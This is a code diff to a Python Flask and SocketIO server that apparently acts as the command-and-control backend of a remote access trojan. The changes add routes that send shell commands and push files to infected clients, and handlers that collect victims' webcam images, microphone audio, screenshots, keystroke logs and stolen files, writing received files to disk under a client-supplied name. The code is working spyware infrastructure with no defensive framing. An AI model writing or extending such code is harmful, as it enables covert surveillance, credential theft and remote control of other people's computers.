@@ -2,18 +2,22 @@
 import os
 import json
 import datetime
-from flask import Flask, render_template, request, send_from_directory
+from flask import Flask, render_template, request, send_from_directory, jsonify
 from flask_socketio import SocketIO, emit
 from werkzeug.utils import secure_filename
+import base64
+
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'secret!'
 app.config['UPLOAD_FOLDER'] = 'uploads'
+app.config['DOWNLOAD_FOLDER'] = 'downloads'
 socketio = SocketIO(app, cors_allowed_origins="*")
 
-# Ensure upload directory exists
-if not os.path.exists(app.config['UPLOAD_FOLDER']):
-    os.makedirs(app.config['UPLOAD_FOLDER'])
+# Ensure directories exist
+for folder in [app.config['UPLOAD_FOLDER'], app.config['DOWNLOAD_FOLDER']]:
+    if not os.path.exists(folder):
+        os.makedirs(folder)
 
 # Track connected clients
 connected_clients = set()
@@ -40,12 +44,34 @@ def send_command():
     command = request.form.get('command')
 
     if not client_id or not command:
-        return {"status": "error", "message": "Missing client_id or command"}, 400
+        return jsonify({"status": "error", "message": "Missing client_id or command"}), 400
 
-    # Emit command to the specified client
+    print(f"[*] Sending command '{command}' to {client_id}")
     socketio.emit('command', command, to=client_id)
+    return jsonify({"status": "success", "message": f"Command '{command}' sent to {client_id}"})
 
-    return {"status": "success", "message": f"Command '{command}' sent to {client_id}"}
+@app.route('/upload', methods=['POST'])
+def upload_file():
+    """Handle file upload from web interface to send to client."""
+    if 'file' not in request.files:
+        return jsonify({"status": "error", "message": "No file part"}), 400
+    file = request.files['file']
+    if file.filename == '':
+        return jsonify({"status": "error", "message": "No selected file"}), 400
+    if file:
+        filename = secure_filename(file.filename)
+        file_data = file.read()
+        file_base64 = base64.b64encode(file_data).decode('utf-8')
+        socketio.emit('upload_file', {
+            "filename": filename,
+            "data": file_base64
+        }, broadcast=True)
+        return jsonify({"status": "success", "message": f"File '{filename}' sent to clients"})
+
+@app.route('/download/<filename>')
+def download(filename):
+    """Serve files for clients to download."""
+    return send_from_directory(app.config['DOWNLOAD_FOLDER'], filename)
 
 @app.route('/view_file/<filename>')
 def view_file(filename):
@@ -85,15 +111,12 @@ def handle_exfil_data(data):
     data_type = data.get('type')
 
     if data_type == "system_info":
-        # Store client info
         username = data.get('system', {}).get('username', None)
         if not username:
-            # Request username via whoami
             socketio.emit('command', 'whoami', to=client_id)
         else:
             client_info[client_id] = data.get('system', {})
             client_info[client_id]['username'] = username
-        # Save system info to a file
         timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
         filename = f"{client_id}_{timestamp}_sysinfo.json"
         filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
@@ -105,15 +128,11 @@ def handle_exfil_data(data):
         command = data.get('command', 'unknown')
         output = data.get('output', '')
         current_dir = data.get('current_dir', 'unknown')
-
-        # Check if the command was whoami to update username
         if command.strip().lower() == 'whoami':
             username = output.strip()
             if client_id not in client_info:
                 client_info[client_id] = {}
             client_info[client_id]['username'] = username
-
-        # Emit command output to web interface
         emit('command_output', {
             'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
             'client_id': client_id,
@@ -123,7 +142,6 @@ def handle_exfil_data(data):
         }, broadcast=True)
 
     elif data_type == "network_data":
-        # Emit network data to web interface
         emit('network_data', {
             'client_id': client_id,
             'timestamp': data.get('timestamp'),
@@ -133,20 +151,54 @@ def handle_exfil_data(data):
             'recv_speed_mbps': data.get('recv_speed_mbps')
         }, broadcast=True)
 
-    # Emit updated client info to web interface
-    client_info_list = [
-        {'id': cid, 'system': info}
-        for cid, info in client_info.items()
-    ]
+    elif data_type == "system_data":
+        emit('system_data', {
+            'client_id': client_id,
+            'timestamp': data.get('timestamp'),
+            'cpu_usage_percent': data.get('cpu_usage_percent'),
+            'memory_usage_mb': data.get('memory_usage_mb')
+        }, broadcast=True)
+
+    elif data_type == "webcam_data":
+        emit('webcam_data', {
+            'client_id': client_id,
+            'image': data.get('image')
+        }, broadcast=True)
+
+    elif data_type == "mic_data":
+        emit('mic_data', {
+            'client_id': client_id,
+            'audio': data.get('audio')
+        }, broadcast=True)
+
+    elif data_type == "screenshot_data":
+        emit('screenshot_data', {
+            'client_id': client_id,
+            'image': data.get('image')
+        }, broadcast=True)
+
+    elif data_type == "keylog_data":
+        emit('keylog_data', {
+            'client_id': client_id,
+            'logs': data.get('logs')
+        }, broadcast=True)
+
+    elif data_type == "file_download":
+        filename = data.get('filename')
+        file_data = base64.b64decode(data.get('data'))
+        filepath = os.path.join(app.config['DOWNLOAD_FOLDER'], filename)
+        with open(filepath, 'wb') as f:
+            f.write(file_data)
+        print(f"[*] Received file {filename} from client {client_id}")
+
+    # Emit updated client info
+    client_info_list = [{'id': cid, 'system': info} for cid, info in client_info.items()]
     emit('client_info', client_info_list, broadcast=True)
 
 @socketio.on('request_client_info')
 def handle_request_client_info():
     """Handle requests for client info from the web interface."""
-    client_info_list = [
-        {'id': cid, 'system': info}
-        for cid, info in client_info.items()
-    ]
+    client_info_list = [{'id': cid, 'system': info} for cid, info in client_info.items()]
     emit('client_info', client_info_list)
 
 if __name__ == "__main__":
